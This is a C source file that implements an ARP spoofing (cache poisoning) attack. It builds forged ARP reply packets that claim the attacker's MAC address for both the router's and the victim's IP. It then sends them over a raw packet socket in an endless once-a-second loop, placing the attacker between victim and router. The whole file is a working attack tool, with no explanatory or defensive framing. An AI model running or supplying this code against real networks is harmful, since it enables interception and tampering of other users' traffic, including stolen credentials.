#include "arp.h"

//Loopers
void arp_poison(struct config *c)
{
    int sd = 0;
    struct sockaddr_ll device;
    struct ifreq interface;

    struct config *conf = (struct config *)c;
    int packet_size = sizeof(struct eth_header) + sizeof(struct arp_header);

    unsigned char *to_victim = (unsigned char *)malloc(packet_size);
    unsigned char *to_router = (unsigned char *)malloc(packet_size);

    struct arp_header *arp_to_victim = (struct arp_header *)malloc(sizeof(struct arp_header));
    struct arp_header *arp_to_router = (struct arp_header *)malloc(sizeof(struct arp_header));
    struct eth_header *eth_to_victim = (struct eth_header *)malloc(sizeof(struct eth_header));
    struct eth_header *eth_to_router = (struct eth_header *)malloc(sizeof(struct eth_header));

    arp_to_victim = build_arp_poison(conf, 0);
    arp_to_router = build_arp_poison(conf, 1);

    eth_to_victim = build_eth(conf, 0);
    eth_to_router = build_eth(conf, 1);

    memcpy(to_victim, eth_to_victim, sizeof(struct eth_header));
    memcpy(to_victim + sizeof(struct eth_header), arp_to_victim, sizeof(struct arp_header));

    memcpy(to_router, eth_to_router, sizeof(struct eth_header));
    memcpy(to_router + sizeof(struct eth_header), arp_to_router, sizeof(struct arp_header));

    // create socket
    if ((sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
    {
        printf("socket error\n");
        exit(1);
    }

    memcpy(interface.ifr_name, conf->interfaceName, HARDWARE_LEN);
    fillSLL(&device, &interface, &sd);

    printf("Size: %d\n ", packet_size);

    while (1)
    {
        sendto(sd, to_victim, packet_size, 0, (struct sockaddr *)&device, sizeof(struct sockaddr_ll));
        sendto(sd, to_router, packet_size, 0, (struct sockaddr *)&device, sizeof(struct sockaddr_ll));
        sleep(1);
        fprintf(stdout, "ARP\n");
    }
}

struct arp_header *build_arp_poison(struct config *conf, int to)
{
    struct arp_header *arp = (struct arp_header *)malloc(sizeof(struct arp_header));

    arp->hardware_type = htons(1);
    arp->protocol_type = htons(ETH_P_IP);
    arp->hardware_len = HARDWARE_LEN;
    arp->protocol_len = IP_LEN;
    arp->opcode = htons(2);

    memcpy(&arp->sender_mac, conf->attackerMac, sizeof(uint8_t) * HARDWARE_LEN);

    // 0 - to Victim
    if (to == 0)
    {
        memcpy(&arp->target_mac, conf->victimMac, sizeof(uint8_t) * HARDWARE_LEN);
        memcpy(arp->target_ip, conf->victimIP, IP_LEN);
        memcpy(arp->sender_ip, conf->routerIP, IP_LEN);
    }
    // 1 - to Router
    else if (to == 1)
    {
        memcpy(&arp->target_mac, conf->routerMac, sizeof(uint8_t) * HARDWARE_LEN);
        memcpy(arp->target_ip, conf->routerIP, IP_LEN);
        memcpy(arp->sender_ip, conf->victimIP, IP_LEN);
    }

    return arp;
}

struct eth_header *build_eth(struct config *conf, int to)
{
    struct eth_header *eth = (struct eth_header *)malloc(sizeof(struct eth_header));

    memcpy(eth->src_mac, conf->attackerMac, sizeof(uint8_t) * HARDWARE_LEN);

    if (to == 0)
        memcpy(eth->dst_mac, conf->victimMac, sizeof(uint8_t) * HARDWARE_LEN);

    else if (to == 1)
        memcpy(eth->dst_mac, conf->routerMac, sizeof(uint8_t) * HARDWARE_LEN);

    eth->eth_type = htons(ETHERTYPE_ARP);

    return eth;
}

void fillSLL(struct sockaddr_ll *sll, struct ifreq *ifr, int *sd)
{
    sll->sll_family = AF_PACKET;
    sll->sll_protocol = htons(ETH_P_ARP);
    sll->sll_hatype = htons(ARPHRD_ETHER);
    sll->sll_pkttype = PACKET_HOST;

    if (ioctl(*sd, SIOCGIFINDEX, ifr) == -1)
    {
        fprintf(stderr, "Error retrieving iface index\n");
        exit(2);
    }
    sll->sll_ifindex = ifr->ifr_ifindex;

    if (ioctl(*sd, SIOCGIFHWADDR, ifr) == -1)
    {
        fprintf(stderr, "Error retrieving iface hw address\n");
        exit(2);
    }
    memcpy(sll->sll_addr, ifr->ifr_addr.sa_data, 8);
    memset(sll->sll_addr + 6, 0, 2);
    sll->sll_halen = ETH_ALEN;
}
